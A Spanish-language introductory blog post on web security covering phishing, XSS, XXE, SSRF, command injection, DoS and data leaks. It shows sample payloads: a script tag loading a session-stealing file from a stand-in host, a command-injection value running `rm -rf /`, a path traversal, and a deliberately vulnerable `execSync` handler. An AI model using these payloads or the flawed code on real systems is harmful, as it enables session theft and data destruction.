---
title: "Seguridad en la web"
description: La seguridad web es la práctica de implementar medidas para proteger un sitio web haciendolo más díficil de vulnerar.
date: 2021-04-15
cover: https://res.cloudinary.com/marcomadera/image/upload/v1618515494/Blog/seguridad-web/security_2_prgizu.png
author: Marco Madera
tags:
  - Seguridad
  - Web
---

![Alerta mimic site a la derecha](https://res.cloudinary.com/marcomadera/image/upload/q_auto,f_auto,c_scale,h_271,w_319/v1618256076/Blog/seguridad-web/Ingenier%C3%ADa_social_yav5tv.png)

Te llega un correo electrónico que parece proceder de tu banco u otro servicio popular de internet como Google y te solicita que confirmes información sensible sobre tu cuenta.

El correo electrónico parece legítimo, ninguna señal de alerta del servicio de que el correo pueda ser peligroso o spam.

El link parece muy realista tiene HTTPS, entonces das clic al link para saber más. Entras a la página, pero no carga porque te interrumpe una alerta del navegador y te das cuenta de que pudiste ser víctima de phishing.

Un ataque por phishing consiste en enviar un correo electrónico que pretende hacer que un usuario se registre en un sitio web, pero que el correo electrónico es una falsificación de un correo electrónico real.

## ¿Qué es la seguridad Web?

La seguridad web es la práctica de implementar medidas para proteger un sitio web haciéndolo más difícil de vulnerar. Es necesaria para proteger un sitio web contra el robo de datos y mantener una reputación con tus usuarios.

Existen muchas razones para que tu sitio web sea vulnerable, de las cuales vamos a poner unas cuantas de las más populares[^1] sobre la mesa.

[^1]: Open Web Application Security Project [OWASP Top Ten](https://owasp.org/www-project-top-ten/)

## Validación y manejo de datos

La validación de datos es el paso que verifica las entradas de usuario. En este paso se asegura que los datos sean los requeridos para que puedan ser procesados correctamente y se ingresen en una base de datos.

Si no se hace correctamente este paso se pueden tener datos corruptos. Por ejemplo en tu lista de canciones favoritas de Spotify puede que tengas datos nulos o tener un usuario de Twitter sin nombre de usuario como es el siguiente caso.

<tweet id="1379691085514047490"></tweet>

<tweet id="1396196807173099524" caption="[Actualización: 22 Mayo 21] A partir de está fecha se le asignó un nombre de usuario, lo cual ya pasaba en las aplicaciones móbiles cambiando cada cierto tiempo."></tweet>

Un mal manejo de datos es una vulnerabilidad potencial. Enviar datos que no son necesarios al _frontend_ puede ser un error por ejemplo si tienes un examen con la siguiente estructura.

```json
{
  "test": [
    {
      "question": "¿Qué url es más segura?",
      "anwers": [
        {
          "text": "https://googIe.com",
          "correct": true
        },
        {
          "text": "http://www.google.com",
          "correct": false
        }
      ]
    }
  ]
}
```

<note type="danger">Estos datos en el lado del cliente (_frontend_) pueden ser expuestos para revelar las respuestas correctas.</note>

<note type="tip">

- Un mejor manejo podría ser que cada vez el usuario responda una pregunta se haga una petición al servidor para saber si es acertada la respuesta del usuario y actuar conforme al resultado.
- Si fueran números de tarjetas de crédito puede que no sea necesario enviar el número completo, sino los últimos 4 dígitos por si el usuario decide revelarlo o como le sea conveniente.

</note>

## Cross-site scripting (XSS)

Una vulnerabilidad de XSS es una vulnerabilidad que se produce cuando un sitio web recibe una entrada de usuario que contiene un código malicioso o se inyecta directamente en el navegador.

### Ataque XSS persistente

Imagina que la sección de comentarios de este post aceptara etiquetas HTML como la de `<script>`. Se pudiera comentar algo como lo siguiente: `<script src= "http://sitioweb/robarsesiones.js">`. Entonces el script se ejecutará cada vez que alguien abra el post. Este es un tipo de ataque persistente porque está inyectado de manera permanente en el sitio web.

El siguiente ejemplo de crear un tweet que se hace retweet cada vez que aparece en pantalla, sería persistente en cuanto aparezca en el _feed_ de una persona haría retweet por si solo.

<youtube id="zv0kZKC6GAM"></youtube>

### Ataque XSS no persistente

El ataque no persistente es aquel en el que el código malicisioso se ejecuta desde el navegador de la victima. Una de la formas de inyectar código es a travez de la consola del navegador. Tal vez te suene si has visto una alerta en algunos sitios web en la consola.

![Alerta XSS en la consola](https://res.cloudinary.com/marcomadera/image/upload/q_auto,f_auto,c_scale,h_227,w_705/v1618249299/Blog/seguridad-web/self-xss_axzj76.png "Alerta XSS en la consola")

Un ejemplo sería si al tener un buscador no validar la query, permitir que la siguiente URL `https://marcomadera.com/search?q=<script type= 'application/javascript'>alert('xss');</script>` ejecute el código.

## XML External Entity (XXE)

Un ataque de entidades externas es el tipo de ataque que abusa del procesador de xml.

> Este ataque puede conducir a la divulgación de datos confidenciales, denegación de servicio, falsificación de solicitudes del lado del servidor, escaneo de puertos desde la perspectiva de la máquina donde se encuentra el analizador y otros impactos del sistema. [Wikipedia](https://en.wikipedia.org/wiki/XML_external_entity_attack)

En el blog de _secrets of app security_ hay un ejemplo claro de un ataque con saml para interceptar solicitudes y remplazarla con tu código [Ataque XXE](https://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html).

Puede que recuerdes el mensaje del punto negro de WhatsApp y iMessage. Este es un ataque de este tipo que tenía oculto múltiples entidades `&lrm;` que cambian la dirección del texto y que el procesador de xml no podía soportar. Otro ataque similar a este es el llamado [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack) que usa entidades `&lol;`.

<tweet id="994230605859651584" caption="El mensaje contenía multiples entidades de dirección del texto &lrm, que sobrecargaban la memoría y hacía que la app dejará de responder" ></tweet>

## Server-side request forgery (SSRF)

En este tipo de ataque el atacador abusa de la funcionalidad del servidor para utilizar los recursos internos de este para hacer una solicitud al servidor.

En una situación normal el _frontend_ de una tienda puede hacer llamadas al servidor para saber si un producto está disponible `http://storeapi.api/product/check`, el atacante hace peticiones al servidor modificando ese _endpoint_, por ejemplo al mismo `http://localhost/admin` abusando de la confianza.

<videogif title="Server Request" src="https://res.cloudinary.com/marcomadera/video/upload/v1618513408/Blog/seguridad-web/server_clic_twfhas.mp4"></videogif>

## Inyección de comandos

Un ataque de inyección de comandos puede ocurrir porque el servidor no valida el input del usuario antes de usarlo en la línea de comandos.

El siguiente ejemplo es un lector de archivos vulnerable que devuelve el contenido del archivo, el usuario puede insertar algo como `"filename.pdf rm -rf /"` y borrar el contenido del servidor entero o dirigirse a una ruta `"../passwords"` provocando un [ataque transversal de directorio](https://en.wikipedia.org/wiki/Directory_traversal_attack "Directory traversal attack- Wikipedia").

```javascript
app.get("/viewer", (req, res) => {
  const { filename } = req.query;
  try {
    const stdout = childProcess.execSync("cat folder/" + filename);
    res.send(stdout.toString());
  } catch (err) {
    res.send(err.toString());
  }
});
```

## Ataque de denegación de servicio (DoS)

El objetivo de este ataque es la sobrecarga de los recursos del sistema para que sea inaccesible a los usuarios. La manera en que funciona es que satura los puertos con más datos de los que puede soportar, entonces al no poder con tantas solicitudes deniega el acceso a los demás usuarios.

Este ataque es una forma de ataque de desbordamiento de memoria comúnmente utilizado por su facilidad de explotar. Existen servicios como Google Cloud Armor y CloudFlare para proteger el sitio web.

## Robo de sesión

Esta explotación es para obtener acceso no autorizado a información o servicios, regularmente teniendo acceso a las cookies y robándolas para así autenticarse y obtener información privada.

<youtube id="UR_i5XSAKrg" ></tweet>

## Filtración de datos

Este mes se puso a disposición para descargar datos de más de 500 millones de usuarios de Facebook, los datos se obtuvieron explotando una vulnerabilidad.

La legislación mexicana obliga a las empresas que tratan con datos personales, a notificar vulneraciones de los datos de los titulares.

> Las vulneraciones de seguridad ocurridas en cualquier fase del tratamiento que afecten de forma significativa los derechos patrimoniales o morales de los titulares, serán informadas de forma inmediata por el responsable al titular, a fin de que este último pueda tomar las medidas correspondientes a la defensa de sus derechos [Artículo 20 - Ley federal de protección de datos personales en posesión de los particulares](http://www.diputados.gob.mx/LeyesBiblio/pdf/LFPDPPP.pdf)

Así como en esta vulnerabilidad mis datos se han visto comprometidos en otras 6 empresas como Bookmate, Nitro, Wattpad y YouNow. De ninguna he tenido ningún aviso para tomar alguna precaución. Por suerte existen páginas como [haveibeenpwned](https://haveibeenpwned.com/) donde te puedes enterar si has sido víctima de estas vulneraciones.

Otro tipo de filtración reciente fue sobre el funcionamiento del navegador de Brave en modo privado con Tor. El funcionamiento es que oculta tu identidad al navegar, pero el navegador enviaba las direcciones que visitabas al proveedor DNS en lugar de enviarlo a los servidores de Tor.

<tweet id="1362737949872431108" ></tweet>

## Programas de recompensas

Algunas empresas tienen programas de recompensas para quienes encuentren vulnerabilidades en sus servicios.

- [Microsoft](https://www.microsoft.com/en-us/msrc/bounty-microsoft-identity?rtc=1)
- [Facebook](https://www.facebook.com/whitehat)
- [Google](https://www.google.com/about/appsecurity/reward-program/)

<tweet id="1366767274720329729" ></tweet>

## Conclusión

Los riesgos en la seguridad web se pueden presentar en diferentes formas. Estos cambian rápidamente y se requiere revisar continuamente. Esta es una práctica continua durante todo el proceso donde se deben de mantener buenas prácticas de seguridad, actualizar librerias, analizar cómo mejorar los canales de desarrollo automatizando la seguridad para que no retrase el proyecto en desarrollo.
